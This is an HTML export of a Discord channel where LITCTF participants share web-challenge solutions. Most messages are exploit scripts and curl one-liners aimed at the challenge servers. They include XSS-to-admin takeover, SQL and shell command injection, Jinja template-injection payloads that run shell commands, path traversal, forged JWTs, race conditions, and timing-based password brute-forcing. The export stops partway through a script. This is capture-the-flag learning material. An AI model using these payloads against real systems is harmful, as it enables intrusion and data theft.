@@ -1,0 +1,1107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CTFdi</title>
+  <style>
+    :root {
+        --primary: #ff2e63;   /* neon red/pink */
+        --secondary: #162447;
+        --accent: #08d9d6;    /* neon blue/cyan */
+        --background: #0a0a0f;
+        --surface: rgba(20, 20, 40, 0.9);
+        --text: #e6f1ff;
+    }
+
+    body {
+        font-family: 'Press Start 2P', monospace;
+        background-color: var(--background);
+        color: var(--text);
+        margin: 0;
+        padding: 20px;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        font-size: 14px; /* bigger font */
+    }
+
+    .chat {
+        width: 100%;
+        max-width: 800px;
+        height: 500px;
+        overflow-y: auto;
+        background: var(--surface);
+        border-radius: 8px;
+        box-shadow: 0 0 25px rgba(255, 46, 99, 0.3);
+        padding: 12px;
+        display: flex;
+        flex-direction: column-reverse;
+    }
+
+    .message {
+        margin: 12px 0;
+        padding: 10px;
+        border-radius: 6px;
+        background: rgba(15, 15, 25, 0.85);
+        box-shadow: 0 0 6px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+        line-height: 1.5;
+    }
+
+    .timestamp {
+        font-size: 11px;
+        color: var(--primary); /* red timestamps */
+        margin-bottom: 4px;
+        display: block;
+        opacity: 0.55;
+    }
+
+    #summary {
+        width: 100%;
+        max-width: 800px;
+        margin: 30px auto;
+        padding: 20px;
+        background: var(--surface);
+        line-height: 1.6;
+        border-radius: 8px;
+        box-shadow: 0 0 20px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+    }
+
+    .content a {
+        color: var(--accent); /* blue links */
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    .content a:hover {
+        opacity: 0.8;
+        text-decoration: underline;
+    }
+
+    /* CRT scanline effect */
+    .scanline {
+        background: linear-gradient(to bottom,
+            rgba(255, 255, 255, 0) 0%,
+            rgba(255, 255, 255, 0.05) 10%,
+            rgba(255, 255, 255, 0) 100%);
+        animation: scanline 8s linear infinite;
+        pointer-events: none;
+    }
+
+    @keyframes scanline {
+        0% { transform: translateY(-100%); }
+        100% { transform: translateY(100%); }
+    }
+</style>
+</head>
+<body>
+  <h1>Channel: [data/ctfs/lit25/web_865613173859418153.json]</h1>
+  <h3>Writeup Chat</h3>
+  <div id="chat" class="chat">
+    <div class="message">
+      <span class="timestamp">2025-08-25T16:05:03.957000+00:00</span>
+      <div class="content">my solve script for my first website
+
+```python
+import requests
+import time
+import re
+URL = "<a href="http://34.44.129.8:52127/"" target="_blank">http://34.44.129.8:52127/"</a>
+
+session = requests.Session()
+
+def signup():
+    user = {
+        'email':'a@a.a',
+        'name':'a',
+        'password':'a',
+        'confirm':'a'
+    }
+    r = session.post(URL + "signup", data=user)
+    
+def login():
+    user = {
+        'name':'a',
+        'password':'a',
+    }
+    r = session.post(URL + "login", data=user)
+
+def comment():
+    comment = {
+        'comment':"&lt;script&gt;fetch('/updatePassword', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'newPassword=123'})&lt;/script&gt;"
+    }
+    r = session.post(URL + "contact", data=comment)
+    # wait for admin visit and change password
+    time.sleep(20)
+    
+def login_admin():
+    user = {
+        'name':'admin',
+        'password':'123',
+    }
+    r = session.post(URL + "login", data=user)
+    
+def change_pw(newPW):
+    newPW = {
+        'newPassword': newPW
+    }
+    r = session.post(URL + "updatePassword", data=newPW)
+    
+def trigger_cmd(username):
+    user = {
+        'name':username,
+        'password':'123',
+    }
+    r = session.post(URL + "login", data=user)
+    r = session.post(URL + "resetDB")
+    
+def get_flag():
+    r = session.get(URL + "static/hihi.txt")
+    print(r.text)
+    
+signup()
+login()
+comment()
+login_admin()
+change_pw("123', username='hihi; mkdir static")
+trigger_cmd("hihi; mkdir static")
+change_pw("123', username='hihi; cat flag* &gt; static/hihi.txt")
+trigger_cmd("hihi; cat flag* &gt; static/hihi.txt")
+get_flag()
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-25T15:44:07.495000+00:00</span>
+      <div class="content">Group chat simple solver lol
+
+```py
+import requests
+
+
+url = "<a href="http://34.44.129.8:54544"" target="_blank">http://34.44.129.8:54544"</a>
+s = requests.Session()
+
+
+
+def set_username(username):
+    global s
+    r = s.post(url + "/set_username", data={"username": username})
+    return s
+
+def send_message(message):
+    global s
+    r = s.post(url + "/send_message", data={"message": message})
+    return r
+
+
+# set_username("{{7*7 ~ '")
+set_username("{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() ~ '")
+send_message("haha")
+set_username("' }}")
+send_message("oooo")
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-25T13:08:08.278000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/738848412912451695/738863205048123403/1409255064379326485" target="_blank">https://discord.com/channels/738848412912451695/738863205048123403/1409255064379326485</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-14T19:24:55.605000+00:00</span>
+      <div class="content">without --path-as-is, curl will go to <a href="http://litctf.org:31778/flag.txt" target="_blank">http://litctf.org:31778/flag.txt</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-14T19:22:59.258000+00:00</span>
+      <div class="content">you don't need url encode, but you need a way to tell you "browser" to not normalize the path
+`curl --path-as-is <a href="http://litctf.org:31778/../flag.txt`" target="_blank">http://litctf.org:31778/../flag.txt`</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T19:54:48.025000+00:00</span>
+      <div class="content">Check this <a href="https://discord.com/channels/738848412912451695/866529872737075221/1272992603704524832" target="_blank">https://discord.com/channels/738848412912451695/866529872737075221/1272992603704524832</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T19:38:52.328000+00:00</span>
+      <div class="content">hi, can u pls explain why do we have to use %2f?
+why isnt this sufficient? <a href="http://litctf.org:31778/" target="_blank">http://litctf.org:31778/</a> ../flag.txt (w/out the space)</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T16:15:39.488000+00:00</span>
+      <div class="content"><a href="https://abuctf.github.io/posts/LITCTF/" target="_blank">https://abuctf.github.io/posts/LITCTF/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T16:07:59.156000+00:00</span>
+      <div class="content">```import requests
+import time
+
+url = '<a href="http://34.31.154.223:56366'" target="_blank">http://34.31.154.223:56366'</a>
+
+length = 7
+charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+margin = 0.2
+
+def generate(currentPassword, position):
+    TPassword = []
+    for char in charset:
+        testPassword = currentPassword[:position] + char + '#' * (length - position - 1)
+        TPassword.append(testPassword)
+    return TPassword
+
+def TPassword(TPassword, CDelay):
+    max_time = 0
+    correctPassword = ''
+
+    for password in TPassword:
+        start_time = time.time()
+        response = requests.post(url, data={'password': password})
+        ETime = time.time() - start_time
+
+        print(f'Testing: {password} | Time taken: {ETime:.2f} seconds')
+
+        if ETime &gt; max_time:
+            max_time = ETime
+            correctPassword = password
+
+        if ETime &gt; CDelay + margin:
+            break
+
+    return correctPassword, max_time
+
+def main():
+    currentPassword = '#' * length
+    CDelay = 1
+
+    for position in range(length):
+        print(f'Finding character at position {position + 1}...')
+
+        TPassword_list = generate(currentPassword, position)
+
+        correctPassword, max_time = TPassword(TPassword_list, CDelay)
+        correctChar = correctPassword[position]
+
+        currentPassword = currentPassword[:position] + correctChar + currentPassword[position + 1:]
+        print(f'Updated password: {currentPassword}')
+
+        CDelay += 1
+
+    print(f'Final password: {currentPassword}')
+
+if __name__ == "__main__":
+    main()
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T09:02:25.741000+00:00</span>
+      <div class="content"><a href="https://owasp.org/www-community/attacks/Path_Traversal" target="_blank">https://owasp.org/www-community/attacks/Path_Traversal</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T07:40:52.410000+00:00</span>
+      <div class="content">Solutions for Web challenges (5/6)
+
+    1. anti-inspect
+        `curl <a href="http://litctf.org:31779/`" target="_blank">http://litctf.org:31779/`</a> 
+        We can find flag in the variable flag value.
+        Flag is `LITCTF{your_fOund_teh_fI@g_94932}`
+    
+    2. traversed
+        We can traversal by using `curl` command and `--path-as-is` option. Do not forget to add `?` . `curl <a href="http://litctf.org:31778/?../../../flag.txt" target="_blank">http://litctf.org:31778/?../../../flag.txt</a> --path-as-is` .
+        
+    3. jwt-1
+        Get cookie `token` and edit at jwt.io and change admin value to true.
+        `curl --cookie 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRiYzEyMyIsImFkbWluIjp0cnVlfQ.tqNm1v5blWB0xJp3yOK73xa-ux6F7stX4yMGcOcmsL0' <a href="http://litctf.org:31781/flag`" target="_blank">http://litctf.org:31781/flag`</a>
+        
+    4. jwt-2
+        in index.ts file, update line 108 as `const token = sign({ name: username, admin: true });`. Start express server and create an account and get token. Then, use this token as cookie for <a href="http://litctf.org:31777/flag" target="_blank">http://litctf.org:31777/flag</a> to get the flag.
+    `curl --cookie 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWFhIiwiYWRtaW4iOnRydWV9.uNFPJ%2BUcCaa4uzBYuZdHshZtWTKgz9RXctBCjkckMOs' <a href="http://litctf.org:31777/flag`" target="_blank">http://litctf.org:31777/flag`</a>
+    
+    5. kirbytime
+        `curl -X POST -d 'password=kBySlaY' <a href="http://34.31.154.223:55601/`" target="_blank">http://34.31.154.223:55601/`</a> so the flag is LITCTF{kBySlaY} . I created bash script to get this correct password.</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T07:08:07.327000+00:00</span>
+      <div class="content">```
+curl --path-as-is "<a href="http://litctf.org:31778/../../../flag.txt"" target="_blank">http://litctf.org:31778/../../../flag.txt"</a>
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T06:45:43.099000+00:00</span>
+      <div class="content">`curl -X GET "<a href="http://litctf.org:31778/?url=../../../flag.txt`" target="_blank">http://litctf.org:31778/?url=../../../flag.txt`</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T05:00:45.631000+00:00</span>
+      <div class="content"><a href="https://youtu.be/db7Md3IkVpQ?si=QDgbzXxmeivWkStH" target="_blank">https://youtu.be/db7Md3IkVpQ?si=QDgbzXxmeivWkStH</a>
+
+Anyone want kablewy writeup vid?
+I record it but too lazy to editvand upload it to youtubue.  😅</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T04:59:19.864000+00:00</span>
+      <div class="content">`curl <a href="http://litctf.org:31779/`" target="_blank">http://litctf.org:31779/`</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T04:21:23.648000+00:00</span>
+      <div class="content">JWT-1, you just need to use <a href="https://token.dev/" target="_blank">https://token.dev/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T04:16:11.379000+00:00</span>
+      <div class="content">my solve
+```python
+import requests
+import time
+url = "<a href="http://34.31.154.223:50202/"" target="_blank">http://34.31.154.223:50202/"</a>
+
+for i in range(32,127):
+    data = {
+    'password':f"kBySlaY"
+# 1. f"{chr(i)}111111"
+# 2. f"k{chr(i)}11111"
+# 3. f"kB{chr(i)}1111"
+# ...
+    }
+    a = time.time()
+    r = requests.post(url, data=data)
+    b=  time.time()
+    print(b-a,chr(i),i)
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T04:15:50.635000+00:00</span>
+      <div class="content">```import requests
+import time
+
+url = '<a href="http://localhost:5000'" target="_blank">http://localhost:5000'</a>
+
+length = 7
+charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
+
+def generate(currentPassword, position):
+    TPassword = []
+    for char in charset:
+        test_password = currentPassword[:position] + char + '#' * (length - position - 1)
+        TPassword.append(test_password)
+    return TPassword
+
+def TPassword(TPassword):
+    times = {}
+    
+    for password in TPassword:
+        start_time = time.time()
+        
+        response = requests.post(url, data={'password': password})
+        
+        elapsed_time = time.time() - start_time
+        
+        print(f'Testing: {password} | Time taken: {elapsed_time:.2f} seconds')
+        
+        times[password] = elapsed_time
+    
+    correctPassword = max(times, key=times.get)
+    return correctPassword
+
+def main():
+    currentPassword = '#' * length
+    
+    for position in range(length):
+        print(f'Finding character at position {position + 1}...')
+        
+        TPassword_list = generate(currentPassword, position)
+        
+        while True:
+            correctPassword = TPassword(TPassword_list)
+            correctChar = correctPassword[position]
+
+            if correctChar:
+                currentPassword = currentPassword[:position] + correctChar + currentPassword[position + 1:]
+                print(f'Updated password: {currentPassword}')
+                break
+            else:
+                print('No correct character found')
+                break
+
+    print(f'Final password: {currentPassword}')
+
+if __name__ == "__main__":
+    main()
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T04:14:44.554000+00:00</span>
+      <div class="content">`curl -X GET "<a href="http://litctf.org:31778/?url=../../../flag.txt`" target="_blank">http://litctf.org:31778/?url=../../../flag.txt`</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T04:06:42.775000+00:00</span>
+      <div class="content">`curl <a href="http://litctf.org:31778/..%2Fflag.txt`" target="_blank">http://litctf.org:31778/..%2Fflag.txt`</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T04:05:28.254000+00:00</span>
+      <div class="content">```
+└─$ curl -X GET "<a href="http://litctf.org:31778/?file=../../../flag.txt"" target="_blank">http://litctf.org:31778/?file=../../../flag.txt"</a>
+LITCTF{backtr@ked_230fim0}```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T03:04:07.367000+00:00</span>
+      <div class="content"><a href="https://tryitands.ee" target="_blank">https://tryitands.ee</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T02:55:56.214000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/crying-emoji-dies-gif-21956120" target="_blank">https://tenor.com/view/crying-emoji-dies-gif-21956120</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-12T22:58:21.711000+00:00</span>
+      <div class="content">[blobsweat~1](<a href="https://cdn.discordapp.com/emojis/1258524288332333106.webp?size=48&amp;quality=lossless&amp;name=blobsweat%7E1)" target="_blank">https://cdn.discordapp.com/emojis/1258524288332333106.webp?size=48&amp;quality=lossless&amp;name=blobsweat%7E1)</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-12T00:09:12.728000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/roach-gif-21306135" target="_blank">https://tenor.com/view/roach-gif-21306135</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-11T01:25:55.914000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/crying-emoji-dies-gif-21956120" target="_blank">https://tenor.com/view/crying-emoji-dies-gif-21956120</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-11T18:08:59.390000+00:00</span>
+      <div class="content">Saw In This Writeup: &lt;<a href="https://loevland.github.io/posts/litctf23/#amogsus-api&gt;" target="_blank">https://loevland.github.io/posts/litctf23/#amogsus-api&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-09T22:02:05.714000+00:00</span>
+      <div class="content">web/art-contest writeup added: <a href="https://ireland.re/Lexington_Informatics_Tournament_CTF_23/#art-contest" target="_blank">https://ireland.re/Lexington_Informatics_Tournament_CTF_23/#art-contest</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T14:53:19.682000+00:00</span>
+      <div class="content">```curl --header "Content-Type: application/json" \
+  --request POST \
+  --data '{"username":"admin","password":true}' \      
+  <a href="http://localhost:8000/login.php```but" target="_blank">http://localhost:8000/login.php```but</a> replace localhost with the actual ip</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T14:48:15.978000+00:00</span>
+      <div class="content">web/amogsus-api
+```py
+import requests
+
+API = '<a href="http://litctf.org:31783'" target="_blank">http://litctf.org:31783'</a>
+
+# Create User
+dummy_user = {'username': 'Yada', 'password': 'Nada'}
+resp = requests.post(API+'/signup', data=dummy_user)
+print(f'[+] Created Dummy User...')
+
+# Get Token
+resp = requests.post(API+'/login', data=dummy_user)
+token = resp.json()['token']
+print(f'[+] Token: {token}')
+
+# Change Your Token Username To "sus" User
+admin = {'username': 'test', 'password': 'LETMEIN'}
+header = {'Authorization': f'Bearer {token}'}
+resp = requests.post(API+'/account/update', headers=header, data=admin)
+print(f'[+] Updating Token Username...')
+
+# Get Flag
+resp = requests.get(API+'/flag', headers=header)
+print(f'[+] Profit: {resp.text}')
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T13:11:50.050000+00:00</span>
+      <div class="content">```bash
+  → cat win.html                                                                                                                                                                                                                                                                                                        1 ↵
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;script&gt;window.XMLHttpRequest = class _ { constructor(){};send(a){};open(a,b,c) {let e=document.createElement("iframe");e.src=b;document.body.appendChild(e);}}&lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;&lt;h1&gt;hhmmm&lt;/h1&gt;&lt;/body&gt;
+&lt;/html&gt;
+ "fetch"
+  → 
+curl '<a href="http://litctf.org:31770/runHTML'" target="_blank">http://litctf.org:31770/runHTML'</a> -F "file=@win.html" &gt; img.png
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T13:07:10.281000+00:00</span>
+      <div class="content">This is what I used:
+```bash
+ "the_even_more_most_lit_foundation"
+  → cat win                                                                                                       130 ↵
+90071992547402.01
+90071992547402.06
+90071992547402.03
+90071992547402.06
+90071992547402.03
+90071992547402.03
+90071992547402.18
+90071992547402.06
+90071992547402.17
+90071992547402.04
+90071992547402.04
+90071992547402.04
+90071992547402.25
+90071992547402.12
+
+ "the_even_more_most_lit_foundation"
+  → for i in `cat win`; do curl -H 'Content-Type: application/json' --data-binary "{\"fund\":\"codetigerorz\",\"amount\":\"$i\"}" '<a href="http://34.130.180.82:55945/api/donate'&amp;;sleep" target="_blank">http://34.130.180.82:55945/api/donate'&amp;;sleep</a> 0.05; done
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T05:48:03.302000+00:00</span>
+      <div class="content"><a href="https://github.com/mde/ejs/blob/main/lib/ejs.js#L637" target="_blank">https://github.com/mde/ejs/blob/main/lib/ejs.js#L637</a>
+
+it is inserted into the template code which will be evaluated</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T05:22:53.862000+00:00</span>
+      <div class="content">```import requests
+import time
+a="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}~_"
+url = "<a href="http://34.130.180.82:50780"" target="_blank">http://34.130.180.82:50780"</a>
+c=""
+while True:
+    for i in a:
+        start_time=time.time()
+        r=requests.post(url,data={"hostname":";`grep -q 'LITCTF"+c+i+"' flag.txt &amp;&amp; sleep 3`;"})
+        end_time=time.time()
+        currenTime=end_time-start_time
+        if currenTime&gt;2:
+            c+=i
+            print(c)
+# payload=";`grep -q "L" flag.txt &amp;&amp; sleep 3`;"
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:58:12.751000+00:00</span>
+      <div class="content"><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp" target="_blank">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:17:41.208000+00:00</span>
+      <div class="content">my bad art contest explanation: <a href="https://canary.discord.com/channels/738848412912451695/865613173859418153/1138322638423461998" target="_blank">https://canary.discord.com/channels/738848412912451695/865613173859418153/1138322638423461998</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:10:47.039000+00:00</span>
+      <div class="content"><a href="https://canary.discord.com/channels/738848412912451695/865613173859418153/1138321724316856411" target="_blank">https://canary.discord.com/channels/738848412912451695/865613173859418153/1138321724316856411</a> right here</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:07:46.012000+00:00</span>
+      <div class="content">upload a file where the filename is a payload with some shit like this ```html
+&lt;script&gt;window.history.pushState('page2', 'winner!!', `/status/${new URLSearchParams(window.location.search).get('id')}`);&lt;/script&gt;.txt
+```
+upload file like `bruh.txt/.html` (extension check bypass) with html like this
+```html
+&lt;body&gt;
+   &lt;script&gt;
+      function parseId(str) {
+         let match = str.match(/\/uploads\/(.*?)\//);
+         return match ? match[1] : null;
+      }
+
+      let id = parseId(window.location.href);
+
+      window.open(`<a href="http://localhost:5000/status/insert_id_of_the_file_with_xss_filename_here?id=${id}`," target="_blank">http://localhost:5000/status/insert_id_of_the_file_with_xss_filename_here?id=${id}`,</a> "_blank")
+   &lt;/script&gt;
+&lt;/body&gt;
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:05:08.156000+00:00</span>
+      <div class="content">```PY
+import requests
+import string
+import time
+
+url = "<a href="http://34.130.180.82:51693/"" target="_blank">http://34.130.180.82:51693/"</a>
+
+crib = "LITCTF{"
+data = {
+    'hostname': f"""1.1.1.1 | [ "$(head -c {len(crib)} flag.txt)" = "{crib}" ] &amp;&amp; (cat flag.txt; sleep 10)""",
+}
+
+for _ in range(100):
+    for c in string.printable:
+        new_crib = crib + c
+        data = {
+            'hostname': f"""1.1.1.1 | [ "$(head -c {len(new_crib)} flag.txt)" = "{new_crib}" ] &amp;&amp; (cat flag.txt; sleep 1)""",
+        }
+        start = time.time()
+        r = requests.post(url, data=data)
+        end = time.time()
+        if end - start &gt; 1:
+            crib = new_crib
+            print(crib)
+            break
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:02:59.248000+00:00</span>
+      <div class="content">```JS
+const requests = [];
+const url = "<a href="http://34.130.180.82:57434/";" target="_blank">http://34.130.180.82:57434/";</a>
+
+// Function to make a donate request
+async function donate(amount) {
+  const requestPromise = fetch(url + "api/donate", {
+    headers: {
+      accept: "*/*",
+      "accept-language": "en-US,en;q=0.9",
+      "content-type": "application/json",
+      prefer: "safe",
+    },
+    referrer: url + "donate.html",
+    referrerPolicy: "strict-origin-when-cross-origin",
+    body: JSON.stringify({ fund: "codetigerorz", amount: amount }),
+    method: "POST",
+    mode: "cors",
+    credentials: "omit",
+  });
+  return requestPromise;
+}
+
+// Use async/await with Promise.all to send requests concurrently
+async function sendRequests() {
+  const firstSetPromises = Array.from({ length: 5 }, () =&gt; donate("90071992547409.91"));
+  const secondSetPromises = Array.from({ length: 1 }, () =&gt; donate("1048576.09"));
+
+  const allPromises = [...firstSetPromises, ...secondSetPromises];
+
+  try {
+    const responses = await Promise.all(allPromises);
+    console.log(responses);
+  } catch (error) {
+    console.error(error);
+  }
+}
+
+// Call the function to send requests concurrently
+sendRequests();
+
+// Fetch the balance as before
+fetch(url + "api/balance", {
+  headers: {
+    accept:
+      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "accept-language": "en-US,en;q=0.9",
+    "cache-control": "max-age=0",
+    "sec-gpc": "1",
+    "upgrade-insecure-requests": "1",
+  },
+  referrerPolicy: "strict-origin-when-cross-origin",
+  body: null,
+  method: "GET",
+  mode: "cors",
+  credentials: "omit",
+})
+  .then((response) =&gt; response.text())
+  .then((text) =&gt; console.log(text))
+  .catch((error) =&gt; console.error(error));
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-06T17:48:17.903000+00:00</span>
+      <div class="content">then what are you waiting for &lt;:thonkery:739829770883170324&gt; go blood it!!!! <a href="http://litctf.org:31794/" target="_blank">http://litctf.org:31794/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-06T16:09:30.418000+00:00</span>
+      <div class="content">the countdown is on the main page <a href="https://lit.lhsmathcs.org/" target="_blank">https://lit.lhsmathcs.org/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-05T18:21:36.914000+00:00</span>
+      <div class="content"><a href="http://34.29.19.233/web/license-inject/license-inject.zip" target="_blank">http://34.29.19.233/web/license-inject/license-inject.zip</a> error 404</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-28T04:27:06.438000+00:00</span>
+      <div class="content">anyways I came here to say that you guys managed to trigger a very special bug in sqlmap for the pokemon chall lol
+<a href="https://github.com/sqlmapproject/sqlmap/issues/444" target="_blank">https://github.com/sqlmapproject/sqlmap/issues/444</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-28T03:26:25.287000+00:00</span>
+      <div class="content"><a href="https://drive.google.com/file/d/14m2695oVBPQOIqxSoso6McfifPVOZhkl/view?usp=sharing" target="_blank">https://drive.google.com/file/d/14m2695oVBPQOIqxSoso6McfifPVOZhkl/view?usp=sharing</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T05:01:09.851000+00:00</span>
+      <div class="content">exploit script, looks like it's working
+```py
+import requests
+
+url = '<a href="http://litctf.live:31781/'" target="_blank">http://litctf.live:31781/'</a>
+flag = 'LITCTF{'
+j = len(flag)+1
+
+payload = '{{self[\'__class__\'][\'__mro__\'][1][\'__subclasses__\']()[POPEN_NUM]("python3 -c \\"from requests import post;print(getattr(post(\'<a href="http://172\'+chr(46)+\'24\'+chr(46)+\'0\'+chr(46)+\'8:8080/runquery\'," target="_blank">http://172\'+chr(46)+\'24\'+chr(46)+\'0\'+chr(46)+\'8:8080/runquery\',</a> json={\'username\': \\\\\\"flag\' AND substr(password, IDX_J, 1)=\'LTR\'--\\\\\\", \'password\': \'\'}), \'text\'))\\"", stdout=-1, shell=True)[\'communicate\']()}}'
+"""
+{{self['__class__']['__mro__'][1]['__subclasses__']()[247]("python3 -c \"from requests import post;print(getattr(post('<a href="http://172'+chr(46)+'24'+chr(46)+'0'+chr(46)+'8:8080/runquery'," target="_blank">http://172'+chr(46)+'24'+chr(46)+'0'+chr(46)+'8:8080/runquery',</a> json={'username': \\\"flag' AND substr(password, 1, 1)='P'--\\\", 'password': ''}), 'text'))\"", stdout=-1, shell=True)['communicate']()}}
+"""
+
+
+while True:
+ for i in range(ord(' '), 128):
+  print(flag + chr(i))
+  pay = payload.replace("IDX_J", str(j)).replace("LTR", chr(i)).replace("POPEN_NUM", "247");
+  res = requests.post(url, data={'username': 'a', 'password': pay})
+  if 'Internal Server Error' in res.text:
+    print('index 247 broken, trying 250')
+    pay = payload.replace("IDX_J", str(j)).replace("LTR", chr(i)).replace("POPEN_NUM", "250");
+    res = requests.post(url, data={'username': 'a', 'password': pay})
+  if 'True' in res.text:
+    flag += chr(i)
+    j += 1
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T04:33:23.206000+00:00</span>
+      <div class="content"><a href="http://litctf.live:31780/rules" target="_blank">http://litctf.live:31780/rules</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T04:13:36.860000+00:00</span>
+      <div class="content">```python
+import requests
+import time
+
+
+p = 3217
+q = 6451
+e = 17
+
+N = p * q
+phi = (p - 1) * (q - 1)
+d = 4880753
+
+def encryptRSA(m):
+    return pow(m, e, N)
+
+def submit(pwd):
+    arr = []
+    for i in range(len(pwd)):
+        arr.append(encryptRSA(ord(pwd[i])))
+    return ",".join(map(str, arr))
+
+assert submit("12345678") == "8272582,17059160,20555739,5510519,9465679,18442920,18644618,3444445"
+
+url = "<a href="http://litctf.live:31776/verify?password="" target="_blank">http://litctf.live:31776/verify?password="</a>
+base = "CxIj6"
+import string
+alphabet = '''!"#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~'''
+print(len(alphabet))
+while True:
+    m = 0
+    mi = 0    
+    for letter in alphabet:
+        password = base + letter
+        password = password.ljust(6, "_")
+        
+        payload = submit(password)
+        # print(url + payload)
+
+        then = time.time()
+        r = requests.get(url + payload, allow_redirects=False)
+        # print(url + payload)
+        now = time.time()
+
+        print(password, round(now - then, 2))
+        # print(now - then, i)
+        # print(r.text)
+        if now - then &gt; m:
+            m = now - then
+            mi = letter
+
+        # fail is r.status_code == 302
+        print(r.status_code)
+        # print(i)
+        # print()
+    print(m, mi)
+    base += mi
+
+#CxIj6p
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T04:10:36.311000+00:00</span>
+      <div class="content">```python
+import requests
+url = "<a href="http://litctf.live:31781"" target="_blank">http://litctf.live:31781"</a>
+import string
+alphabet = "{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.,_?!"
+print(alphabet)
+flag = "LITCTF{flush3d_3m0ji_"
+
+# python3 -c "import requests;r=requests.post(\"<a href="http://172.24.0.8:8080/runquery\",json={\"username\":" target="_blank">http://172.24.0.8:8080/runquery\",json={\"username\":</a> \"flag' AND password LIKE 'LITCTF{flush3d_3m0ji%' --\",\"password\": \"wtv\"});print(r.text)"
+# {{(((''|attr("__class__")|attr("__mro__"))[-1])|attr("__subclasses__")())[250]((request|attr("form"))["username"],shell=True,stdout=-1)|attr("communicate")()}}
+
+while True:
+    lastflag = flag
+    for letter in alphabet:
+        t = letter
+        payload = flag + t
+        payload = payload.replace("_", "~_")
